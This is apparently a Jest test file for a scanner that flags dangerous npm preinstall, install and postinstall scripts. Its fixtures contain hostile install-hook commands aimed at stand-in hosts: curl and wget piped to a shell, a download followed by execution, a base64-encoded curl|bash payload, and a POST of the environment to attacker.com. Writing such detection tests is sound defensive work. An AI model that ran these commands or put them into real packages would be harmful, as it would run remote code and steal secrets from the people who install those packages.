import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { PostinstallScanner } from '../scanners/postinstall-scanner';

function createTempProject(packages: Record<string, any>): string {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sentori-postinstall-test-'));
  const nodeModules = path.join(tmpDir, 'node_modules');
  fs.mkdirSync(nodeModules, { recursive: true });

  for (const [packageName, packageJson] of Object.entries(packages)) {
    let packagePath: string;
    
    // Handle scoped packages
    if (packageName.startsWith('@')) {
      const [scope, name] = packageName.split('/');
      packagePath = path.join(nodeModules, scope, name);
    } else {
      packagePath = path.join(nodeModules, packageName);
    }
    
    fs.mkdirSync(packagePath, { recursive: true });
    fs.writeFileSync(
      path.join(packagePath, 'package.json'),
      JSON.stringify(packageJson, null, 2)
    );
  }

  return tmpDir;
}

function cleanup(dir: string): void {
  fs.rmSync(dir, { recursive: true, force: true });
}

describe('PostinstallScanner', () => {
  describe('Basic functionality', () => {
    test('detects missing node_modules', async () => {
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sentori-no-modules-'));
      const scanner = new PostinstallScanner();
      
      try {
        const result = await scanner.scan(tmpDir);
        expect(result.findings.length).toBe(1);
        expect(result.findings[0].severity).toBe('info');
        expect(result.findings[0].message).toContain('No node_modules');
      } finally {
        cleanup(tmpDir);
      }
    });

    test('scans direct dependencies (depth=1)', async () => {
      const dir = createTempProject({
        'safe-package': {
          name: 'safe-package',
          version: '1.0.0',
        },
        'package-with-postinstall': {
          name: 'package-with-postinstall',
          version: '1.0.0',
          scripts: {
            postinstall: 'echo "Hello World"',
          },
        },
      });
      
      const scanner = new PostinstallScanner({ depth: 1 });
      
      try {
        const result = await scanner.scan(dir);
        const postinstallFindings = result.findings.filter(f => f.rule === 'POSTINSTALL-001');
        expect(postinstallFindings.length).toBe(1);
        expect(postinstallFindings[0].message).toContain('package-with-postinstall');
        expect(result.scannedFiles).toBe(2);
      } finally {
        cleanup(dir);
      }
    });

    test('handles scoped packages', async () => {
      const dir = createTempProject({
        '@scope/package': {
          name: '@scope/package',
          version: '1.0.0',
          scripts: {
            preinstall: 'echo "preinstall"',
          },
        },
      });
      
      const scanner = new PostinstallScanner();
      
      try {
        const result = await scanner.scan(dir);
        const findings = result.findings.filter(f => f.rule === 'POSTINSTALL-001');
        expect(findings.length).toBe(1);
        expect(findings[0].message).toContain('@scope/package');
      } finally {
        cleanup(dir);
      }
    });
  });

  describe('POSTINSTALL-002: Suspicious patterns', () => {
    test('detects curl pipe to shell', async () => {
      const dir = createTempProject({
        'malicious-package': {
          name: 'malicious-package',
          version: '1.0.0',
          scripts: {
            postinstall: 'curl http://evil.com/script.sh | bash',
          },
        },
      });
      
      const scanner = new PostinstallScanner();
      
      try {
        const result = await scanner.scan(dir);
        const suspiciousFindings = result.findings.filter(f => f.rule === 'POSTINSTALL-002');
        expect(suspiciousFindings.length).toBeGreaterThanOrEqual(1);
        expect(suspiciousFindings[0].severity).toBe('critical');
        expect(suspiciousFindings[0].message).toContain('curl pipe to shell');
      } finally {
        cleanup(dir);
      }
    });

    test('detects wget pipe to shell', async () => {
      const dir = createTempProject({
        'bad-package': {
          name: 'bad-package',
          version: '1.0.0',
          scripts: {
            install: 'wget http://evil.com/payload.sh | sh',
          },
        },
      });
      
      const scanner = new PostinstallScanner();
      
      try {
        const result = await scanner.scan(dir);
        const suspiciousFindings = result.findings.filter(f => f.rule === 'POSTINSTALL-002');
        expect(suspiciousFindings.length).toBeGreaterThanOrEqual(1);
        expect(suspiciousFindings[0].severity).toBe('critical');
      } finally {
        cleanup(dir);
      }
    });

    test('detects eval calls', async () => {
      const dir = createTempProject({
        'eval-package': {
          name: 'eval-package',
          version: '1.0.0',
          scripts: {
            postinstall: 'node -e "eval(process.env.PAYLOAD)"',
          },
        },
      });
      
      const scanner = new PostinstallScanner();
      
      try {
        const result = await scanner.scan(dir);
        const evalFindings = result.findings.filter(
          f => f.rule === 'POSTINSTALL-002' && f.message?.includes('eval')
        );
        expect(evalFindings.length).toBeGreaterThanOrEqual(1);
        expect(evalFindings[0].severity).toBe('high');
      } finally {
        cleanup(dir);
      }
    });

    test('detects chmod +x then execute', async () => {
      const dir = createTempProject({
        'chmod-package': {
          name: 'chmod-package',
          version: '1.0.0',
          scripts: {
            preinstall: 'chmod +x ./malware.sh; ./malware.sh',
          },
        },
      });
      
      const scanner = new PostinstallScanner();
      
      try {
        const result = await scanner.scan(dir);
        const chmodFindings = result.findings.filter(
          f => f.rule === 'POSTINSTALL-002' && f.message?.includes('chmod')
        );
        expect(chmodFindings.length).toBeGreaterThanOrEqual(1);
        expect(chmodFindings[0].severity).toBe('high');
      } finally {
        cleanup(dir);
      }
    });

    test('detects download and execute patterns', async () => {
      const dir = createTempProject({
        'download-exec': {
          name: 'download-exec',
          version: '1.0.0',
          scripts: {
            postinstall: 'curl -o /tmp/payload http://evil.com/p; bash /tmp/payload',
          },
        },
      });
      
      const scanner = new PostinstallScanner();
      
      try {
        const result = await scanner.scan(dir);
        const downloadFindings = result.findings.filter(
          f => f.rule === 'POSTINSTALL-002' && f.message?.includes('download and execute')
        );
        expect(downloadFindings.length).toBeGreaterThanOrEqual(1);
        expect(downloadFindings[0].severity).toBe('critical');
      } finally {
        cleanup(dir);
      }
    });
  });

  describe('POSTINSTALL-003: Suspicious TLDs', () => {
    test('detects suspicious top-level domains', async () => {
      const dir = createTempProject({
        'sus-tld': {
          name: 'sus-tld',
          version: '1.0.0',
          scripts: {
            postinstall: 'curl https://malware.tk/script.sh',
          },
        },
      });
      
      const scanner = new PostinstallScanner();
      
      try {
        const result = await scanner.scan(dir);
        const tldFindings = result.findings.filter(f => f.rule === 'POSTINSTALL-003');
        expect(tldFindings.length).toBeGreaterThanOrEqual(1);
        expect(tldFindings[0].severity).toBe('high');
        expect(tldFindings[0].message).toContain('Suspicious TLD');
      } finally {
        cleanup(dir);
      }
    });
  });

  describe('POSTINSTALL-004: IP addresses', () => {
    test('detects non-localhost IP addresses', async () => {
      const dir = createTempProject({
        'ip-package': {
          name: 'ip-package',
          version: '1.0.0',
          scripts: {
            postinstall: 'curl http://192.168.1.100/payload',
          },
        },
      });
      
      const scanner = new PostinstallScanner();
      
      try {
        const result = await scanner.scan(dir);
        const ipFindings = result.findings.filter(f => f.rule === 'POSTINSTALL-004');
        expect(ipFindings.length).toBeGreaterThanOrEqual(1);
        expect(ipFindings[0].severity).toBe('medium');
      } finally {
        cleanup(dir);
      }
    });

    test('ignores localhost IPs', async () => {
      const dir = createTempProject({
        'localhost-package': {
          name: 'localhost-package',
          version: '1.0.0',
          scripts: {
            postinstall: 'curl http://127.0.0.1:3000',
          },
        },
      });
      
      const scanner = new PostinstallScanner();
      
      try {
        const result = await scanner.scan(dir);
        const ipFindings = result.findings.filter(f => f.rule === 'POSTINSTALL-004');
        expect(ipFindings.length).toBe(0);
      } finally {
        cleanup(dir);
      }
    });
  });

  describe('POSTINSTALL-005: Base64 encoding', () => {
    test('detects base64-encoded content with decoding', async () => {
      const dir = createTempProject({
        'b64-package': {
          name: 'b64-package',
          version: '1.0.0',
          scripts: {
            postinstall: 'echo "Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZCB8IGJhc2g=" | base64 -d | bash',
          },
        },
      });
      
      const scanner = new PostinstallScanner();
      
      try {
        const result = await scanner.scan(dir);
        const b64Findings = result.findings.filter(f => f.rule === 'POSTINSTALL-005');
        expect(b64Findings.length).toBeGreaterThanOrEqual(1);
        expect(b64Findings[0].severity).toBe('high');
      } finally {
        cleanup(dir);
      }
    });
  });

  describe('POSTINSTALL-006: Environment variable exfiltration', () => {
    test('detects potential env exfiltration', async () => {
      const dir = createTempProject({
        'exfil-package': {
          name: 'exfil-package',
          version: '1.0.0',
          scripts: {
            postinstall: 'curl -X POST http://attacker.com -d "$(env)"',
          },
        },
      });
      
      const scanner = new PostinstallScanner();
      
      try {
        const result = await scanner.scan(dir);
        const exfilFindings = result.findings.filter(f => f.rule === 'POSTINSTALL-006');
        expect(exfilFindings.length).toBeGreaterThanOrEqual(1);
        expect(exfilFindings[0].severity).toBe('critical');
        expect(exfilFindings[0].message).toContain('environment variable exfiltration');
      } finally {
        cleanup(dir);
      }
    });
  });

  describe('Depth configuration', () => {
    test('respects depth=1 configuration', async () => {
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sentori-depth-test-'));
      const nodeModules = path.join(tmpDir, 'node_modules');
      
      // Create a package with nested dependencies
      const pkg1Path = path.join(nodeModules, 'package1');
      fs.mkdirSync(pkg1Path, { recursive: true });
      fs.writeFileSync(
        path.join(pkg1Path, 'package.json'),
        JSON.stringify({
          name: 'package1',
          scripts: { postinstall: 'echo "level 1"' },
        })
      );
      
      // Nested dependency
      const nested = path.join(pkg1Path, 'node_modules', 'nested-package');
      fs.mkdirSync(nested, { recursive: true });
      fs.writeFileSync(
        path.join(nested, 'package.json'),
        JSON.stringify({
          name: 'nested-package',
          scripts: { postinstall: 'echo "level 2"' },
        })
      );
      
      const scanner = new PostinstallScanner({ depth: 1 });
      
      try {
        const result = await scanner.scan(tmpDir);
        const postinstallFindings = result.findings.filter(f => f.rule === 'POSTINSTALL-001');
        // Should only find the top-level package, not nested
        expect(postinstallFindings.length).toBe(1);
        expect(postinstallFindings[0].message).toContain('package1');
      } finally {
        cleanup(tmpDir);
      }
    });

    test('scans all levels with depth=-1', async () => {
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'sentori-unlimited-test-'));
      const nodeModules = path.join(tmpDir, 'node_modules');
      
      // Create a package with nested dependencies
      const pkg1Path = path.join(nodeModules, 'package1');
      fs.mkdirSync(pkg1Path, { recursive: true });
      fs.writeFileSync(
        path.join(pkg1Path, 'package.json'),
        JSON.stringify({
          name: 'package1',
          scripts: { postinstall: 'echo "level 1"' },
        })
      );
      
      // Nested dependency
      const nested = path.join(pkg1Path, 'node_modules', 'nested-package');
      fs.mkdirSync(nested, { recursive: true });
      fs.writeFileSync(
        path.join(nested, 'package.json'),
        JSON.stringify({
          name: 'nested-package',
          scripts: { postinstall: 'echo "level 2"' },
        })
      );
      
      const scanner = new PostinstallScanner({ depth: -1 });
      
      try {
        const result = await scanner.scan(tmpDir);
        const postinstallFindings = result.findings.filter(f => f.rule === 'POSTINSTALL-001');
        // Should find both levels
        expect(postinstallFindings.length).toBe(2);
      } finally {
        cleanup(tmpDir);
      }
    });
  });

  describe('Multiple lifecycle hooks', () => {
    test('detects all lifecycle hooks (preinstall, install, postinstall)', async () => {
      const dir = createTempProject({
        'multi-hook': {
          name: 'multi-hook',
          version: '1.0.0',
          scripts: {
            preinstall: 'echo "pre"',
            install: 'echo "install"',
            postinstall: 'echo "post"',
          },
        },
      });
      
      const scanner = new PostinstallScanner();
      
      try {
        const result = await scanner.scan(dir);
        const hookFindings = result.findings.filter(f => f.rule === 'POSTINSTALL-001');
        expect(hookFindings.length).toBe(3);
        
        const messages = hookFindings.map(f => f.message);
        expect(messages.some(m => m?.includes('preinstall'))).toBe(true);
        expect(messages.some(m => m?.includes('install'))).toBe(true);
        expect(messages.some(m => m?.includes('postinstall'))).toBe(true);
      } finally {
        cleanup(dir);
      }
    });
  });
});
